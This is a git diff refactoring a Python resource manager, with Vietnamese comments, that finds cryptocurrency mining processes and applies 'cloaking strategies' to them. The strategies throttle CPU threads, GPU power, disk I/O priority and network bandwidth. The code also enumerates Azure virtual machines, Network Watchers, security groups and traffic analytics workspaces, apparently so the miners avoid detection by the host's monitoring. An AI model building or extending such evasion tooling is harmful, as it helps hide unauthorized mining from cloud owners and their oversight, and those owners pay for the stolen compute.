@@ -1,3 +1,5 @@
+# resource_manager.py
+
 import os
 import logging
 import subprocess
@@ -11,7 +13,7 @@ from typing import List, Any, Dict, Optional
 from readerwriterlock import rwlock
 
 from .base_manager import BaseManager
-from .utils import MiningProcess, GPUManager  # Import GPUManager
+from .utils import MiningProcess, GPUManager
 from .cloak_strategies import CloakStrategyFactory
 
 from .azure_clients import (
@@ -36,54 +38,67 @@ from .auxiliary_modules.power_management import (
 )
 
 
-def assign_process_resources(pid: int, resources: Dict[str, Any], process_name: str, logger: logging.Logger):
+def assign_process_resources(pid: int, resources: Dict[str, Any],
+                             process_name: str, logger: logging.Logger):
     """
-    Hàm thay thế cho assign_process_to_cgroups, áp dụng các điều chỉnh tài nguyên 
-    thông qua taskset và các lệnh hệ thống khác.
+    Thay thế cho assign_process_to_cgroups, áp dụng điều chỉnh tài nguyên 
+    bằng taskset và các lệnh hệ thống khác (chưa đầy đủ do thiếu cgroup).
     """
 
+    # Điều chỉnh CPU threads (taskset)
     if 'cpu_threads' in resources:
         try:
             cpu_count = psutil.cpu_count(logical=True)
             desired_threads = resources['cpu_threads']
             if desired_threads > cpu_count or desired_threads <= 0:
                 logger.warning(
-                    f"Số luồng CPU yêu cầu ({desired_threads}) không hợp lệ. Bỏ qua.")
+                    f"Số luồng CPU yêu cầu ({desired_threads}) không hợp lệ. Bỏ qua."
+                )
             else:
                 cores = ",".join(map(str, range(desired_threads)))
                 subprocess.run(['taskset', '-cp', cores, str(pid)], check=True)
                 logger.info(
-                    f"Đã áp dụng giới hạn {desired_threads} luồng CPU cho tiến trình {process_name} (PID: {pid}).")
+                    f"Đã áp dụng giới hạn {desired_threads} luồng CPU cho tiến trình "
+                    f"{process_name} (PID: {pid})."
+                )
         except Exception as e:
             logger.error(
-                f"Lỗi khi điều chỉnh luồng CPU bằng taskset cho {process_name} (PID: {pid}): {e}")
+                f"Lỗi khi điều chỉnh luồng CPU cho {process_name} (PID: {pid}): {e}"
+            )
 
     if 'memory' in resources:
         logger.warning(
-            f"Không thể giới hạn RAM cho tiến trình {process_name} (PID: {pid}) do không có cgroup_manager. Bỏ qua.")
+            f"Không thể giới hạn RAM cho tiến trình {process_name} (PID: {pid}) do chưa cấu hình cgroup. Bỏ qua."
+        )
 
     if 'cpu_freq' in resources:
         logger.warning(
-            f"Không thể trực tiếp điều chỉnh tần số CPU cho tiến trình {process_name} (PID: {pid}) mà không sử dụng cgroup. Bỏ qua.")
+            f"Không thể trực tiếp điều chỉnh tần số CPU cho tiến trình {process_name} "
+            f"(PID: {pid}) do chưa cấu hình cgroup. Bỏ qua."
+        )
 
     if 'disk_io_limit_mbps' in resources:
         logger.warning(
-            f"Không thể trực tiếp điều chỉnh Disk I/O cho tiến trình {process_name} (PID: {pid}) mà không sử dụng cgroup. Bỏ qua.")
+            f"Không thể trực tiếp điều chỉnh Disk I/O cho tiến trình {process_name} "
+            f"(PID: {pid}) do chưa cấu hình cgroup. Bỏ qua."
+        )
 
 
 class SharedResourceManager:
     """
-    Lớp chứa các hàm điều chỉnh tài nguyên dùng chung.
+    Lớp cung cấp các hàm điều chỉnh tài nguyên (CPU, RAM, GPU, Disk, Network...) 
+    sử dụng GPUManager và các hàm tiện ích.
     """
     def __init__(self, config: Dict[str, Any], logger: logging.Logger):
         self.config = config
         self.logger = logger
-        self.original_resource_limits = {}
-        self.gpu_manager = GPUManager()  # Sử dụng GPUManager
-        
+        self.original_resource_limits = {}  # Lưu giới hạn gốc để restore
+        self.gpu_manager = GPUManager()     # Quản lý GPU
+
     def is_gpu_initialized(self) -> bool:
         self.logger.debug(
-            f"Checking if GPU is initialized: {self.gpu_manager.gpu_initialized}")
+            f"Checking GPU initialization: {self.gpu_manager.gpu_initialized}"
+        )
         return self.gpu_manager.gpu_initialized
 
     def shutdown_nvml(self):
@@ -91,140 +106,173 @@ class SharedResourceManager:
 
     def adjust_cpu_threads(self, pid: int, cpu_threads: int, process_name: str):
         try:
-            assign_process_resources(pid, {'cpu_threads': cpu_threads},
-                                     process_name, self.logger)
+            assign_process_resources(
+                pid,
+                {'cpu_threads': cpu_threads},
+                process_name,
+                self.logger
+            )
             self.logger.info(
-                f"Điều chỉnh số luồng CPU xuống {cpu_threads} cho tiến trình {process_name} (PID: {pid}).")
+                f"Điều chỉnh số luồng CPU xuống {cpu_threads} cho tiến trình "
+                f"{process_name} (PID: {pid})."
+            )
         except Exception as e:
             self.logger.error(
-                f"Lỗi khi điều chỉnh số luồng CPU cho tiến trình {process_name} (PID: {pid}): {e}")
+                f"Lỗi khi điều chỉnh CPU threads cho {process_name} (PID: {pid}): {e}"
+            )
 
-    def adjust_ram_allocation(self, pid: int, ram_allocation_mb: int, process_name: str):
+    def adjust_ram_allocation(self, pid: int, ram_allocation_mb: int,
+                              process_name: str):
         try:
-            assign_process_resources(pid, {'memory': ram_allocation_mb},
-                                     process_name, self.logger)
+            assign_process_resources(
+                pid,
+                {'memory': ram_allocation_mb},
+                process_name,
+                self.logger
+            )
             self.logger.info(
-                f"Điều chỉnh giới hạn RAM xuống {ram_allocation_mb}MB cho tiến trình {process_name} (PID: {pid}).")
+                f"Điều chỉnh giới hạn RAM xuống {ram_allocation_mb}MB cho tiến trình "
+                f"{process_name} (PID: {pid})."
+            )
         except Exception as e:
             self.logger.error(
-                f"Lỗi khi điều chỉnh RAM cho tiến trình {process_name} (PID: {pid}): {e}")
+                f"Lỗi khi điều chỉnh RAM cho {process_name} (PID: {pid}): {e}"
+            )
 
     def adjust_gpu_usage(self, process: MiningProcess, gpu_usage_percent: List[float]):
-        """
-        Điều chỉnh mức sử dụng GPU theo %.
-        """
         try:
-            # Bảo vệ tránh trường hợp list rỗng hoặc invalid
+            # Kiểm tra đầu vào là list
             if not isinstance(gpu_usage_percent, list):
                 gpu_usage_percent = []
 
-            new_gpu_usage_percent = [
-                min(
-                    max(gpu + self.config["optimization_parameters"].get("gpu_power_adjustment_step", 10), 0),
-                    100
-                )
+            step = self.config["optimization_parameters"].get("gpu_power_adjustment_step", 10)
+            new_gpu_usage = [
+                min(max(gpu + step, 0), 100)
                 for gpu in gpu_usage_percent
             ]
-            set_gpu_usage(process.pid, new_gpu_usage_percent)
+            set_gpu_usage(process.pid, new_gpu_usage)
             self.logger.info(
-                f"Điều chỉnh mức sử dụng GPU xuống {new_gpu_usage_percent} cho tiến trình {process.name} (PID: {process.pid}).")
+                f"Điều chỉnh GPU usage thành {new_gpu_usage} cho tiến trình "
+                f"{process.name} (PID: {process.pid})."
+            )
         except Exception as e:
             self.logger.error(
-                f"Lỗi khi điều chỉnh mức sử dụng GPU cho tiến trình {process.name} (PID: {process.pid}): {e}")
+                f"Lỗi khi điều chỉnh GPU usage cho {process.name} (PID: {process.pid}): {e}"
+            )
 
     def adjust_disk_io_limit(self, process: MiningProcess, disk_io_limit_mbps: float):
-        """
-        Điều chỉnh giới hạn Disk I/O cho tiến trình.
-        """
         try:
             current_limit = temperature_monitor.get_current_disk_io_limit(process.pid)
-            adjustment_step = self.config["optimization_parameters"].get("disk_io_limit_step_mbps", 1)
-            if current_limit > disk_io_limit_mbps:
-                new_limit = current_limit - adjustment_step
-            else:
-                new_limit = current_limit + adjustment_step
-            new_limit = max(
-                self.config["resource_allocation"]["disk_io"]["min_limit_mbps"],
-                min(
-                    new_limit,
-                    self.config["resource_allocation"]["disk_io"]["max_limit_mbps"]
+            step = self.config["optimization_parameters"].get("disk_io_limit_step_mbps", 1)
+
+            if current_limit is not None and isinstance(disk_io_limit_mbps, (int, float)):
+                new_limit = (current_limit - step
+                             if current_limit > disk_io_limit_mbps
+                             else current_limit + step)
+
+                min_l = self.config["resource_allocation"]["disk_io"]["min_limit_mbps"]
+                max_l = self.config["resource_allocation"]["disk_io"]["max_limit_mbps"]
+                new_limit = max(min_l, min(new_limit, max_l))
+
+                assign_process_resources(
+                    process.pid,
+                    {'disk_io_limit_mbps': new_limit},
+                    process.name,
+                    self.logger
                 )
-            )
-            assign_process_resources(process.pid, {'disk_io_limit_mbps': new_limit},
-                                     process.name, self.logger)
-            self.logger.info(
-                f"Điều chỉnh giới hạn Disk I/O xuống {new_limit} Mbps cho tiến trình {process.name} (PID: {process.pid}).")
+                self.logger.info(
+                    f"Điều chỉnh Disk I/O xuống {new_limit} Mbps cho tiến trình "
+                    f"{process.name} (PID: {process.pid})."
+                )
+            else:
+                self.logger.warning(
+                    f"Giá trị current_limit hoặc disk_io_limit_mbps không hợp lệ "
+                    f"cho tiến trình {process.name} (PID: {process.pid})."
+                )
         except Exception as e:
             self.logger.error(
-                f"Lỗi khi điều chỉnh Disk I/O cho tiến trình {process.name} (PID: {process.pid}): {e}")
+                f"Lỗi khi điều chỉnh Disk I/O cho tiến trình {process.name} (PID: {process.pid}): {e}"
+            )
 
     def adjust_network_bandwidth(self, process: MiningProcess, bandwidth_limit_mbps: float):
-        """
-        Điều chỉnh băng thông mạng cho tiến trình.
-        """
         try:
             self.apply_network_cloaking(
-                process.network_interface, bandwidth_limit_mbps, process)
+                process.network_interface,
+                bandwidth_limit_mbps,
+                process
+            )
             self.logger.info(
-                f"Điều chỉnh giới hạn băng thông mạng xuống {bandwidth_limit_mbps} Mbps cho tiến trình {process.name} (PID: {process.pid}).")
+                f"Điều chỉnh băng thông mạng xuống {bandwidth_limit_mbps} Mbps "
+                f"cho tiến trình {process.name} (PID: {process.pid})."
+            )
         except Exception as e:
             self.logger.error(
-                f"Lỗi khi điều chỉnh Mạng cho tiến trình {process.name} (PID: {process.pid}): {e}")
+                f"Lỗi khi điều chỉnh Mạng cho {process.name} (PID: {process.pid}): {e}"
+            )
 
     def adjust_cpu_frequency(self, pid: int, frequency: int, process_name: str):
         try:
-            assign_process_resources(pid, {'cpu_freq': frequency},
-                                     process_name, self.logger)
+            assign_process_resources(
+                pid,
+                {'cpu_freq': frequency},
+                process_name,
+                self.logger
+            )
             self.logger.info(
-                f"Đặt tần số CPU xuống {frequency}MHz cho tiến trình {process_name} (PID: {pid}).")
+                f"Đặt tần số CPU = {frequency}MHz cho tiến trình {process_name} (PID: {pid})."
+            )
         except Exception as e:
             self.logger.error(
-                f"Lỗi khi điều chỉnh tần số CPU cho tiến trình {process_name} (PID: {pid}): {e}")
+                f"Lỗi khi điều chỉnh tần số CPU cho {process_name} (PID: {pid}): {e}"
+            )
 
     def adjust_gpu_power_limit(self, pid: int, power_limit: int, process_name: str):
         try:
             pynvml.nvmlInit()
-            handle = pynvml.nvmlDeviceGetHandleByIndex(0)  # giả định 1 GPU
+            handle = pynvml.nvmlDeviceGetHandleByIndex(0)
             pynvml.nvmlDeviceSetPowerManagementLimit(handle, power_limit * 1000)
             pynvml.nvmlShutdown()
             self.logger.info(
-                f"Đặt giới hạn công suất GPU xuống {power_limit}W cho tiến trình {process_name} (PID: {pid}).")
+                f"Đặt power limit GPU = {power_limit}W cho tiến trình {process_name} (PID: {pid})."
+            )
         except Exception as e:
             self.logger.error(
-                f"Lỗi khi điều chỉnh công suất GPU cho tiến trình {process_name} (PID: {pid}): {e}")
+                f"Lỗi khi điều chỉnh power GPU cho {process_name} (PID: {pid}): {e}"
+            )
 
     def adjust_disk_io_priority(self, pid: int, ionice_class: int, process_name: str):
         try:
-            subprocess.run(['ionice', '-c', str(ionice_class),
-                            '-p', str(pid)], check=True)
+            subprocess.run(['ionice', '-c', str(ionice_class), '-p', str(pid)], check=True)
             self.logger.info(
-                f"Đặt ionice class thành {ionice_class} cho tiến trình {process_name} (PID: {pid}).")
+                f"Đặt ionice class={ionice_class} cho tiến trình {process_name} (PID: {pid})."
+            )
         except subprocess.CalledProcessError as e:
-            self.logger.error(f"Lỗi khi thực hiện ionice: {e}")
+            self.logger.error(f"Lỗi khi chạy ionice: {e}")
         except Exception as e:
             self.logger.error(
-                f"Lỗi khi điều chỉnh ưu tiên Disk I/O cho tiến trình {process_name} (PID: {pid}): {e}")
+                f"Lỗi khi adjust Disk I/O priority cho {process_name} (PID: {pid}): {e}"
+            )
 
     def drop_caches(self):
         try:
             with open('/proc/sys/vm/drop_caches', 'w') as f:
                 f.write('3\n')
-            self.logger.info("Đã giảm sử dụng cache bằng cách drop_caches.")
+            self.logger.info("Đã drop caches.")
         except Exception as e:
-            self.logger.error(f"Lỗi khi giảm sử dụng cache: {e}")
+            self.logger.error(f"Lỗi khi drop caches: {e}")
 
-    def apply_network_cloaking(self, interface: str, bandwidth_limit: float, process: MiningProcess):
+    def apply_network_cloaking(self, interface: str, bandwidth_limit: float,
+                               process: MiningProcess):
         try:
             self.configure_network_interface(interface, bandwidth_limit)
         except Exception as e:
             self.logger.error(
-                f"Lỗi khi áp dụng cloaking mạng cho tiến trình {process.name} (PID: {process.pid}): {e}")
+                f"Lỗi cloaking mạng cho {process.name} (PID: {process.pid}): {e}"
+            )
             raise
 
     def configure_network_interface(self, interface: str, bandwidth_limit: float):
-        """
-        Cấu hình giao diện mạng (tc, iptables, ...). Placeholder.
-        """
+        """Placeholder cho lệnh tc/iptables."""
         pass
 
     def throttle_cpu_based_on_load(self, process: MiningProcess, load_percent: float):
@@ -237,15 +285,22 @@ class SharedResourceManager:
                 new_freq = 3000
             self.adjust_cpu_frequency(process.pid, new_freq, process.name)
             self.logger.info(
-                f"Điều chỉnh tần số CPU xuống {new_freq}MHz cho tiến trình {process.name} (PID: {process.pid}) dựa trên tải {load_percent}%.")
+                f"Giảm tần số CPU = {new_freq}MHz dựa trên load={load_percent}% cho "
+                f"{process.name} (PID: {process.pid})."
+            )
         except Exception as e:
             self.logger.error(
-                f"Lỗi khi điều chỉnh tần số CPU dựa trên tải cho tiến trình {process.name} (PID: {process.pid}): {e}")
+                f"Lỗi khi throttle CPU cho {process.name} (PID: {process.pid}): {e}"
+            )
 
     def apply_cloak_strategy(self, strategy_name: str, process: MiningProcess):
+        """
+        Áp dụng strategy cloaking (cpu, gpu, network, v.v.).
+        """
         try:
             self.logger.debug(
-                f"Đang tạo chiến lược {strategy_name} cho tiến trình {process.name} (PID: {process.pid})")
+                f"Tạo strategy {strategy_name} cho {process.name} (PID: {process.pid})"
+            )
             strategy = CloakStrategyFactory.create_strategy(
                 strategy_name,
                 self.config,
@@ -253,144 +308,137 @@ class SharedResourceManager:
                 self.is_gpu_initialized()
             )
         except Exception as e:
-            self.logger.error(f"Không thể tạo chiến lược {strategy_name}: {e}")
+            self.logger.error(f"Không thể tạo strategy {strategy_name}: {e}")
             raise
 
-        if strategy:
-            try:
-                adjustments = strategy.apply(process)
-                if adjustments:
-                    self.logger.info(
-                        f"Áp dụng điều chỉnh {strategy_name} cho tiến trình {process.name} (PID: {process.pid}): {adjustments}"
-                    )
+        if not strategy:
+            msg = f"Strategy {strategy_name} không tạo thành công cho {process.name}."
+            self.logger.warning(msg)
+            raise RuntimeError(msg)
 
-                    pid = process.pid
-                    if pid not in self.original_resource_limits:
-                        self.original_resource_limits[pid] = {}
+        try:
+            adjustments = strategy.apply(process)
+            if adjustments:
+                self.logger.info(
+                    f"Áp dụng strategy {strategy_name} => {adjustments} "
+                    f"cho {process.name} (PID: {process.pid})."
+                )
 
-                    for key, value in adjustments.items():
-                        if key == 'cpu_freq':
-                            original_freq = self.get_current_cpu_frequency(pid)
-                            self.original_resource_limits[pid]['cpu_freq'] = original_freq
-                        elif key == 'gpu_power_limit':
-                            original_power_limit = self.get_current_gpu_power_limit(pid)
-                            self.original_resource_limits[pid]['gpu_power_limit'] = original_power_limit
-                        elif key == 'network_bandwidth_limit_mbps':
-                            original_bw_limit = self.get_current_network_bandwidth_limit(pid)
-                            self.original_resource_limits[pid]['network_bandwidth_limit_mbps'] = original_bw_limit
-                        elif key == 'ionice_class':
-                            original_ionice_class = self.get_current_ionice_class(pid)
-                            self.original_resource_limits[pid]['ionice_class'] = original_ionice_class
-                        # ... Lưu các giới hạn khác tương tự
+                pid = process.pid
+                if pid not in self.original_resource_limits:
+                    self.original_resource_limits[pid] = {}
 
-                    self.execute_adjustments(adjustments, process)
-                else:
-                    self.logger.warning(
-                        f"Không có điều chỉnh nào được áp dụng cho chiến lược {strategy_name} cho tiến trình {process.name} (PID: {process.pid})."
-                    )
-            except Exception as e:
-                self.logger.error(
-                    f"Lỗi khi áp dụng chiến lược cloaking {strategy_name} cho tiến trình {process.name} (PID: {process.pid}): {e}")
-                raise
-        else:
-            warning_message = f"Chiến lược cloaking {strategy_name} không được tạo thành công cho tiến trình {process.name} (PID: {process.pid})."
-            self.logger.warning(warning_message)
-            raise RuntimeError(warning_message)
+                # Lưu giới hạn gốc
+                for key, _value in adjustments.items():
+                    if key == 'cpu_freq':
+                        original_freq = self.get_current_cpu_frequency(pid)
+                        self.original_resource_limits[pid]['cpu_freq'] = original_freq
+                    elif key == 'gpu_power_limit':
+                        orig_gpu_power = self.get_current_gpu_power_limit(pid)
+                        self.original_resource_limits[pid]['gpu_power_limit'] = orig_gpu_power
+                    elif key == 'network_bandwidth_limit_mbps':
+                        orig_bw = self.get_current_network_bandwidth_limit(pid)
+                        self.original_resource_limits[pid]['network_bandwidth_limit_mbps'] = orig_bw
+                    elif key == 'ionice_class':
+                        orig_ionice = self.get_current_ionice_class(pid)
+                        self.original_resource_limits[pid]['ionice_class'] = orig_ionice
+                    # ... Lưu thêm nếu cần
+
+                self.execute_adjustments(adjustments, process)
+            else:
+                self.logger.warning(
+                    f"Không có điều chỉnh nào cho strategy {strategy_name} "
+                    f"với tiến trình {process.name} (PID: {process.pid})."
+                )
+        except Exception as e:
+            self.logger.error(
+                f"Lỗi khi áp dụng cloaking {strategy_name} cho {process.name} (PID: {process.pid}): {e}"
+            )
+            raise
 
     def restore_resources(self, process: MiningProcess):
-        """
-        Khôi phục tài nguyên cho tiến trình sau khi đã xác nhận an toàn.
-        """
+        """Khôi phục tài nguyên cho tiến trình."""
         try:
             pid = process.pid
             process_name = process.name
-            original_limits = self.original_resource_limits.get(pid)
-            if not original_limits:
+            orig_limits = self.original_resource_limits.get(pid)
+            if not orig_limits:
                 self.logger.warning(
-                    f"Không tìm thấy giới hạn tài nguyên ban đầu cho tiến trình {process_name} (PID: {pid}).")
+                    f"Không tìm thấy original limits cho {process_name} (PID: {pid})."
+                )
                 return
 
-            cpu_freq = original_limits.get('cpu_freq')
-            if cpu_freq:
-                self.adjust_cpu_frequency(pid, cpu_freq, process_name)
+            if 'cpu_freq' in orig_limits:
+                self.adjust_cpu_frequency(pid, orig_limits['cpu_freq'], process_name)
                 self.logger.info(
-                    f"Đã khôi phục tần số CPU về {cpu_freq}MHz cho tiến trình {process_name} (PID: {pid}).")
+                    f"Khôi phục CPU freq={orig_limits['cpu_freq']} cho {process_name} (PID: {pid})."
+                )
 
-            cpu_threads = original_limits.get('cpu_threads')
-            if cpu_threads:
-                self.adjust_cpu_threads(pid, cpu_threads, process_name)
-                self.logger.info(
-                    f"Đã khôi phục số luồng CPU về {cpu_threads} cho tiến trình {process_name} (PID: {pid}).")
+            if 'cpu_threads' in orig_limits:
+                self.adjust_cpu_threads(pid, orig_limits['cpu_threads'], process_name)
 
-            ram_allocation_mb = original_limits.get('ram_allocation_mb')
-            if ram_allocation_mb:
-                self.adjust_ram_allocation(pid, ram_allocation_mb, process_name)
-                self.logger.info(
-                    f"Đã khôi phục giới hạn RAM về {ram_allocation_mb}MB cho tiến trình {process_name} (PID: {pid}).")
+            if 'ram_allocation_mb' in orig_limits:
+                self.adjust_ram_allocation(pid, orig_limits['ram_allocation_mb'], process_name)
 
-            gpu_power_limit = original_limits.get('gpu_power_limit')
-            if gpu_power_limit:
-                self.adjust_gpu_power_limit(pid, gpu_power_limit, process_name)
-                self.logger.info(
-                    f"Đã khôi phục giới hạn công suất GPU về {gpu_power_limit}W cho tiến trình {process_name} (PID: {pid}).")
+            if 'gpu_power_limit' in orig_limits:
+                self.adjust_gpu_power_limit(pid, orig_limits['gpu_power_limit'], process_name)
 
-            ionice_class = original_limits.get('ionice_class')
-            if ionice_class:
-                self.adjust_disk_io_priority(pid, ionice_class, process_name)
-                self.logger.info(
-                    f"Đã khôi phục lớp ionice về {ionice_class} cho tiến trình {process_name} (PID: {pid}).")
+            if 'ionice_class' in orig_limits:
+                self.adjust_disk_io_priority(pid, orig_limits['ionice_class'], process_name)
 
-            network_bandwidth_limit_mbps = original_limits.get('network_bandwidth_limit_mbps')
-            if network_bandwidth_limit_mbps:
-                self.adjust_network_bandwidth(process, network_bandwidth_limit_mbps)
-                self.logger.info(
-                    f"Đã khôi phục giới hạn băng thông mạng về {network_bandwidth_limit_mbps} Mbps cho tiến trình {process_name} (PID: {pid}).")
+            if 'network_bandwidth_limit_mbps' in orig_limits:
+                self.adjust_network_bandwidth(process, orig_limits['network_bandwidth_limit_mbps'])
 
             del self.original_resource_limits[pid]
             self.logger.info(
-                f"Đã khôi phục tất cả tài nguyên cho tiến trình {process_name} (PID: {pid}).")
-
+                f"Khôi phục xong mọi tài nguyên cho {process_name} (PID: {pid})."
+            )
         except Exception as e:
             self.logger.error(
-                f"Lỗi khi khôi phục tài nguyên cho tiến trình {process.name} (PID: {process.pid}): {e}")
+                f"Lỗi khi khôi phục resource cho {process.name} (PID: {process.pid}): {e}"
+            )
             raise
 
+    # Placeholder getters
     def get_current_cpu_frequency(self, pid: int) -> int:
-        return 3000  # Placeholder
+        return 3000
 
     def get_current_gpu_power_limit(self, pid: int) -> int:
-        return 200  # Placeholder
+        return 200
 
     def get_current_network_bandwidth_limit(self, pid: int) -> float:
-        return 1000.0  # Placeholder
+        return 1000.0
 
     def get_current_ionice_class(self, pid: int) -> int:
-        return 2  # Placeholder
+        return 2
 
     def execute_adjustments(self, adjustments: Dict[str, Any], process: MiningProcess):
+        """
+        Thực hiện chỉnh sửa tài nguyên cho process (CPU freq, GPU limit, network...).
+        """
         pid = process.pid
-        process_name = process.name
+        name = process.name
 
-        for key, value in adjustments.items():
+        for key, val in adjustments.items():
             if key == 'cpu_freq':
-                self.adjust_cpu_frequency(pid, int(value), process_name)
+                self.adjust_cpu_frequency(pid, int(val), name)
             elif key == 'gpu_power_limit':
-                self.adjust_gpu_power_limit(pid, int(value), process_name)
+                self.adjust_gpu_power_limit(pid, int(val), name)
             elif key == 'network_bandwidth_limit_mbps':
-                self.adjust_network_bandwidth(process, float(value))
+                self.adjust_network_bandwidth(process, float(val))
             elif key == 'ionice_class':
-                self.adjust_disk_io_priority(pid, int(value), process_name)
+                self.adjust_disk_io_priority(pid, int(val), name)
             elif key == 'cpu_threads':
-                self.adjust_cpu_threads(pid, int(value), process_name)
+                self.adjust_cpu_threads(pid, int(val), name)
             elif key == 'ram_allocation_mb':
-                self.adjust_ram_allocation(pid, int(value), process_name)
+                self.adjust_ram_allocation(pid, int(val), name)
             elif key == 'drop_caches':
                 self.drop_caches()
 
 
 class ResourceManager(BaseManager):
     """
-    Lớp quản lý và điều chỉnh tài nguyên hệ thống.
+    Lớp chính quản lý, điều phối tài nguyên.
     """
     _instance = None
     _instance_lock = Lock()
@@ -398,12 +446,12 @@ class ResourceManager(BaseManager):
     def __new__(cls, *args, **kwargs):
         with cls._instance_lock:
             if cls._instance is None:
-                cls._instance = super(ResourceManager, cls).__new__(cls)
+                cls._instance = super().__new__(cls)
         return cls._instance
 
     def __init__(self, config: Dict[str, Any], logger: logging.Logger):
         super().__init__(config, logger)
-        if hasattr(self, '_initialized') and self._initialized:
+        if getattr(self, '_initialized', False):
             return
         self._initialized = True
 
@@ -411,42 +459,58 @@ class ResourceManager(BaseManager):
         self.logger = logger
 
         self.stop_event = Event()
+
         self.resource_lock = rwlock.RWLockFair()
         self.resource_adjustment_queue = PriorityQueue()
         self.cloaking_request_queue = Queue()
-        self.processed_tasks = set()  # Khởi tạo thuộc tính để theo dõi nhiệm vụ đã xử lý
+        self.processed_tasks = set()
 
         self.mining_processes = []
         self.mining_processes_lock = rwlock.RWLockFair()
 
+        # Azure clients
         self.initialize_azure_clients()
         self.discover_azure_resources()
 
+        # Tạo threads
         self.initialize_threads()
+        # SharedResourceManager cho các thao tác chung
         self.shared_resource_manager = SharedResourceManager(config, logger)
 
     def start(self):
         self.logger.info("Bắt đầu ResourceManager...")
         self.discover_mining_processes()
         self.start_threads()
-        self.logger.info("ResourceManager đã khởi động thành công.")
+        self.logger.info("ResourceManager đã khởi động xong.")
 
     def stop(self):
         self.logger.info("Dừng ResourceManager...")
         self.stop_event.set()
         self.join_threads()
         self.shutdown_power_management()
-        self.logger.info("ResourceManager đã dừng thành công.")
+        self.logger.info("ResourceManager đã dừng.")
 
     def initialize_threads(self):
         self.monitor_thread = Thread(
-            target=self.monitor_and_adjust, name="MonitorThread", daemon=True)
+            target=self.monitor_and_adjust,
+            name="MonitorThread",
+            daemon=True
+        )
         self.optimization_thread = Thread(
-            target=self.optimize_resources, name="OptimizationThread", daemon=True)
+            target=self.optimize_resources,
+            name="OptimizationThread",
+            daemon=True
+        )
         self.cloaking_thread = Thread(
-            target=self.process_cloaking_requests, name="CloakingThread", daemon=True)
+            target=self.process_cloaking_requests,
+            name="CloakingThread",
+            daemon=True
+        )
         self.resource_adjustment_thread = Thread(
-            target=self.resource_adjustment_handler, name="ResourceAdjustmentThread", daemon=True)
+            target=self.resource_adjustment_handler,
+            name="ResourceAdjustmentThread",
+            daemon=True
+        )
 
     def start_threads(self):
         self.monitor_thread.start()
@@ -455,7 +519,6 @@ class ResourceManager(BaseManager):
         self.resource_adjustment_thread.start()
 
     def join_threads(self):
-        # Đảm bảo không gọi task_done() thêm khi thread dừng, tránh double-calls
         self.monitor_thread.join()
         self.optimization_thread.join()
         self.cloaking_thread.join()
@@ -475,335 +538,332 @@ class ResourceManager(BaseManager):
     def discover_azure_resources(self):
         try:
             self.vms = self.azure_monitor_client.discover_resources(
-                'Microsoft.Compute/virtualMachines')
+                'Microsoft.Compute/virtualMachines'
+            )
             self.logger.info(f"Khám phá {len(self.vms)} Máy ảo.")
 
             self.network_watchers = self.azure_network_watcher_client.discover_resources(
-                'Microsoft.Network/networkWatchers')
+                'Microsoft.Network/networkWatchers'
+            )
             self.logger.info(f"Khám phá {len(self.network_watchers)} Network Watchers.")
 
             self.nsgs = self.azure_network_watcher_client.discover_resources(
-                'Microsoft.Network/networkSecurityGroups')
-            self.logger.info(f"Khám phá {len(self.nsgs)} Network Security Groups.")
+                'Microsoft.Network/networkSecurityGroups'
+            )
+            self.logger.info(f"Khám phá {len(self.nsgs)} NSGs.")
 
             self.traffic_analytics_workspaces = self.azure_traffic_analytics_client.get_traffic_workspace_ids()
             self.logger.info(
-                f"Khám phá {len(self.traffic_analytics_workspaces)} Traffic Analytics Workspaces.")
+                f"Khám phá {len(self.traffic_analytics_workspaces)} Traffic Analytics Workspaces."
+            )
 
             self.ml_clusters = self.azure_ml_client.discover_ml_clusters()
-            self.logger.info(
-                f"Khám phá {len(self.ml_clusters)} Azure ML Clusters.")
+            self.logger.info(f"Khám phá {len(self.ml_clusters)} Azure ML Clusters.")
         except Exception as e:
-            self.logger.error(f"Lỗi khi khám phá tài nguyên Azure: {e}")
+            self.logger.error(f"Lỗi khám phá Azure: {e}")
 
     def discover_mining_processes(self):
-        cpu_process_name = self.config['processes'].get('CPU', '').lower()
-        gpu_process_name = self.config['processes'].get('GPU', '').lower()
+        cpu_name = self.config['processes'].get('CPU', '').lower()
+        gpu_name = self.config['processes'].get('GPU', '').lower()
 
         with self.mining_processes_lock.gen_wlock():
             self.mining_processes.clear()
             for proc in psutil.process_iter(['pid', 'name']):
-                proc_name = proc.info['name'].lower()
-                if cpu_process_name in proc_name or gpu_process_name in proc_name:
-                    priority = self.get_process_priority(proc.info['name'])
-                    network_interface = self.config.get('network_interface', 'eth0')
+                pname = proc.info['name'].lower()
+                if cpu_name in pname or gpu_name in pname:
+                    prio = self.get_process_priority(proc.info['name'])
+                    net_if = self.config.get('network_interface', 'eth0')
                     mining_proc = MiningProcess(
-                        proc.info['pid'], proc.info['name'],
-                        priority, network_interface, self.logger
+                        proc.info['pid'], proc.info['name'], prio, net_if, self.logger
                     )
                     self.mining_processes.append(mining_proc)
-            self.logger.info(
-                f"Khám phá {len(self.mining_processes)} tiến trình khai thác."
-            )
+            self.logger.info(f"Khám phá {len(self.mining_processes)} tiến trình khai thác.")
 
     def get_process_priority(self, process_name: str) -> int:
         priority_map = self.config.get('process_priority_map', {})
-        priority = priority_map.get(process_name.lower(), 1)
-        
-        # Nếu priority là dict hoặc kiểu không hợp lệ, gán giá trị mặc định là 1
-        if isinstance(priority, dict) or not isinstance(priority, int):
+        pri_val = priority_map.get(process_name.lower(), 1)
+        if isinstance(pri_val, dict) or not isinstance(pri_val, int):
             self.logger.warning(
-                f"Priority cho tiến trình '{process_name}' không phải int, chuyển thành 1. priority={priority}")
+                f"Priority cho tiến trình '{process_name}' không phải int, gán 1."
+            )
             return 1
-        return priority
+        return pri_val
 
     def monitor_and_adjust(self):
         """
-        Theo dõi và điều chỉnh tài nguyên.
+        Luồng theo dõi + điều chỉnh tài nguyên.
         """
-        monitoring_params = self.config.get("monitoring_parameters", {})
-        temperature_check_interval = monitoring_params.get("temperature_monitoring_interval_seconds", 10)
-        power_check_interval = monitoring_params.get("power_monitoring_interval_seconds", 10)
+        mon_params = self.config.get("monitoring_parameters", {})
+        temp_intv = mon_params.get("temperature_monitoring_interval_seconds", 10)
+        power_intv = mon_params.get("power_monitoring_interval_seconds", 10)
 
         while not self.stop_event.is_set():
             try:
                 self.discover_mining_processes()
                 self.allocate_resources_with_priority()
 
-                temperature_limits = self.config.get("temperature_limits", {})
-                cpu_max_temp = temperature_limits.get("cpu_max_celsius", 75)
-                gpu_max_temp = temperature_limits.get("gpu_max_celsius", 85)
+                temp_lims = self.config.get("temperature_limits", {})
+                cpu_max_temp = temp_lims.get("cpu_max_celsius", 75)
